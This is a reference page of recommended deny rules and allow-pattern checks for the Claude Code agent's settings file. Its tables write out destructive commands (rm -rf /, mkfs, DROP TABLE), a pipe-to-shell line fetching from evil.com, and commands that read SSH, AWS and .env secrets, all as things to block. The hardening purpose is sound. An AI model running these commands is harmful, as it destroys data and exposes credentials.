# Deny Rule Patterns

Recommended deny rules for Claude Code `.claude/settings.json`.

## Critical (Must Have)

These deny rules prevent catastrophic operations:

| Pattern | Prevents | Example |
|---------|----------|---------|
| `rm -rf /` | Root filesystem deletion | `rm -rf /` |
| `rm -rf ~` | Home directory deletion | `rm -rf ~/` |
| `chmod 777` | World-writable permissions | `chmod 777 /etc/passwd` |
| `curl\|sh`, `curl\|bash`, `wget\|sh`, `wget\|bash` | Pipe-to-shell attacks | `curl evil.com \| bash` |
| `git push --force origin main` | Force push to main | Overwriting shared history |
| `git push --force origin master` | Force push to master | Overwriting shared history |
| `DROP TABLE` | Database table destruction | `DROP TABLE users;` |
| `DELETE FROM` (without WHERE) | Mass data deletion | `DELETE FROM users;` |
| `TRUNCATE TABLE` | Table data destruction | `TRUNCATE TABLE logs;` |

## High Priority (Strongly Recommended)

| Pattern | Prevents | Rationale |
|---------|----------|-----------|
| `pkill`, `killall` | Process termination | Could kill critical services |
| `mkfs` | Filesystem formatting | Irreversible data loss |
| `dd if=` | Raw disk operations | Could overwrite disk |
| `shutdown`, `reboot` | System power operations | Disrupts all work |
| `iptables`, `ufw` | Firewall modification | Could lock out access |
| `useradd`, `userdel` | User management | System-level changes |
| `systemctl stop`, `systemctl disable` | Service management | Could stop critical services |

## Sensitive File Protection

These patterns protect credential and secret files:

| Pattern | Protects |
|---------|----------|
| `cat .env`, `cat *.env*` | Environment secrets |
| `cat *.key`, `cat *.pem` | Cryptographic keys |
| `cat *credentials*`, `cat *secret*` | Credential files |
| `cat ~/.ssh/*` | SSH keys |
| `cat ~/.aws/*` | AWS credentials |
| `cat ~/.config/gcloud/*` | GCP credentials |

## Overly Broad Allow Patterns to Flag

These allow patterns are dangerous if present:

| Pattern | Risk Level | Why |
|---------|------------|-----|
| `Bash(*)` | Critical | Allows any bash command |
| `Bash(rm:*)` | High | Allows any file deletion |
| `Bash(curl:*)` | Medium | Allows arbitrary HTTP requests |
| `Bash(sudo:*)` | Critical | Allows privilege escalation |
| `Bash(chmod:*)` | High | Allows permission changes |
| `Bash(chown:*)` | High | Allows ownership changes |

## Safe Allow Patterns

These are generally safe to allow:

| Pattern | Scope |
|---------|-------|
| `Bash(git:*)` | Git operations only |
| `Bash(npm:*)`, `Bash(yarn:*)`, `Bash(pnpm:*)`, `Bash(bun:*)` | Package manager |
| `Bash(node:*)`, `Bash(python3:*)` | Runtime execution |
| `Bash(cargo:*)` | Rust build tool |
| `Bash(make:*)` | Build tool |
| `Bash(docker:*)` | Container operations |
| `Bash(gh:*)` | GitHub CLI |
| `Bash(jq:*)` | JSON processing |
| `Bash(wc:*)`, `Bash(sort:*)`, `Bash(head:*)`, `Bash(tail:*)` | Text processing |

## Implementing Deny Rules

In `.claude/settings.json`:
```json
{
  "deny": [
    "rm -rf /",
    "rm -rf ~",
    "chmod 777",
    "git push --force origin main",
    "git push --force origin master"
  ]
}
```

Note: Deny rules use substring matching. A deny rule of `rm -rf /` will match any command containing that substring.
